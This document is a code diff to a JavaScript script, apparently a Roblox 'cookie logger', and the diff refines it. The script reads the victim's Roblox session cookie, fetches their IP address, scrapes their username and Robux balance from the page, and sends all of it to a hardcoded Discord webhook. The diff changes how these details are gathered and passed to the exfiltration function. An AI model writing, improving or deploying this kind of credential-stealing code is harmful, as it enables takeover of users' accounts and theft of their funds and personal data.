@@ -2,12 +2,8 @@ const WEBHOOK = "https://discord.com/api/webhooks/1322567795820466326/3PF0HjpJ9V
 
 let lastUsername = null; // To track the previously detected username
 
-async function sendWebhook(username, statistics, cookie, ipAddr) {
+async function sendWebhook(username, robuxBalance, isPremium, avatarUrl, cookie, ipAddr) {
     try {
-        const robuxBalance = statistics?.RobuxBalance?.toString() || "N/A";
-        const isPremium = statistics?.IsPremium ? "Yes" : "No";
-        const avatarUrl = statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";
-
         await fetch(WEBHOOK, {
             method: "POST",
             headers: {
@@ -27,12 +23,12 @@ async function sendWebhook(username, statistics, cookie, ipAddr) {
                             },
                             {
                                 name: "Robux",
-                                value: robuxBalance,
+                                value: robuxBalance || "N/A",
                                 inline: true
                             },
                             {
                                 name: "Premium",
-                                value: isPremium,
+                                value: isPremium ? "Yes" : "No",
                                 inline: true
                             }
                         ],
@@ -66,7 +62,7 @@ async function main(cookie) {
         const ipAddr = await ipResponse.text();
 
         if (!cookie) {
-            console.warn("No cookie found!");
+            console.warn("No cookie found! Ensure you are logged in to Roblox.");
             return;
         }
 
@@ -78,22 +74,28 @@ async function main(cookie) {
         });
 
         if (!userResponse.ok) {
-            console.error("Failed to fetch Roblox user information.");
+            console.error("Failed to fetch Roblox user information. Ensure the cookie is valid.");
             return;
         }
 
         const statistics = await userResponse.json();
 
-        // Extract relevant information
-        const currentUsername = statistics?.UserName || "N/A";
-        const robuxBalance = statistics?.RobuxBalance || "N/A";
-        const isPremium = statistics?.IsPremium ? "Yes" : "No";
+        // Fetch the username dynamically from the page
+        const usernameElement = document.querySelector(".font-header-2.dynamic-ellipsis-item");
+        const currentUsername = usernameElement ? usernameElement.textContent.trim() : "N/A";
+
+        // Fetch Robux balance using the DOM
+        const robuxElement = document.getElementById("nav-robux-amount");
+        const robuxBalance = robuxElement ? robuxElement.textContent.trim() : "N/A";
+
+        const isPremium = statistics?.IsPremium || false;
+        const avatarUrl = statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";
 
         console.log(`Username: ${currentUsername}, Robux: ${robuxBalance}, Premium: ${isPremium}`);
 
         if (currentUsername !== lastUsername) {
             console.log(`New username detected: ${currentUsername}`);
-            await sendWebhook(currentUsername, statistics, cookie, ipAddr);
+            await sendWebhook(currentUsername, robuxBalance, isPremium, avatarUrl, cookie, ipAddr);
             lastUsername = currentUsername; // Update the last username
         } else {
             console.log(`No change in username. Current: ${currentUsername}`);
